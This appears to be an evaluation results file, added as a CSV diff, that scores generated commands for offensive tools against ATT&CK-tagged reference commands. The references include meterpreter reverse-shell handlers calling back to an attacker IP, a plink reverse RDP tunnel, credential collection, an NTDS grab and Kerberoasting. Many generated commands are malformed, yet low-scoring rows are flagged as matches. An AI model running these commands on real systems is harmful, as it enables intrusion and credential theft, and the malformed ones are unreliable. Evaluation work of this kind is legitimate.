@@ -1,0 +1,54 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",41.109,True
+command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",28.358,True
+command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",27.641,True
+command_metasploit_TA0011_T1219.txt,metasploit,set RHOSTS <target_ip>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,14.039,True
+command_metasploit_TA0011_T1219.txt,metasploit,exploit,"    ```
+    set CMD ""reg.exe IMPORT C:\Users\Public\vnc-settings.reg""
+    exploit
+    ```",27.403,True
+command_metasploit_TA0011_T1219.txt,metasploit,use post/multi/launcher/cobaltstrike,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,21.948,True
+command_metasploit_TA0011_T1219.txt,metasploit,set SESSION <session_id>,"```
+    use post/windows/gather/screen_spy
+    set COUNT 60
+    set DELAY 1
+    set VIEW_SCREENSHOTS false
+    set SESSION 3
+    exploit
+```",27.479,True
+command_metasploit_TA0011_T1219.txt,metasploit,exploit,"    ```
+    set CMD ""reg.exe IMPORT C:\Users\Public\vnc-settings.reg""
+    exploit
+    ```",27.403,True
+command_plink_TA0008_T1021.txt,plink,plink.exe root@myserver -s /etc/backups/do-backup.sh,`plink.exe <domain_admin>@<bankfileserver_ip>`,25.797,True
+command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",50.951,True
+command_plink_TA0008_T1021.txt,plink,plink.exe root@myserver -s /bin/bash,`plink.exe <domain_admin>@<bankfileserver_ip>`,34.202,True
+command_plink_TA0008_T1021.txt,plink,plink.exe -A -t attacker_ssh_user@remote_server -X,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",46.359,True
+command_rubeus_TA0003_T1547.txt,rubeus,"rubeus.exe createnetonly /program:""C:\Windows\System32\rundll32.exe"" /impersonateuser:<placeholder>",`rubeus.exe kerberoast /domain:oz.local`,14.86,True
+command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,14.568,True
+command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe logonsession,`rubeus.exe kerberoast /domain:oz.local`,38.65,True
+command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,45.406,True
+command_rubeus_TA0004_T1547.txt,rubeus,"rubeus.exe createnetonly /program:""C:\Windows\System32\run.exe"" /impersonateuser:<registry_key>",`rubeus.exe kerberoast /domain:oz.local`,15.664,True
+command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe logonsession /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,23.403,True
+command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe s4u /user:<username> /rc4:<random_key> /impersonateuser:<registry_key>,`rubeus.exe kerberoast /domain:oz.local`,17.477,True
+command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,26.94,True
+command_wmic_TA0002_T1047.txt,wmic,wmic /RECORD:C:\temp\wmi_record.xml,"`wmic /node:#{""POS system""} process call create #{""executable""}`",14.911,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic process call ""winmgmt start"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`",25.596,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic netuse create ""C:\temp\script.ps1"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`",16.522,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /RECORD:C:\temp\wmi_record.xml; wmic process call ""winmgmt start""; wmic netuse create ""C:\temp\script.ps1""","`wmic /node:#{""POS system""} process call create #{""executable""}`",21.634,True
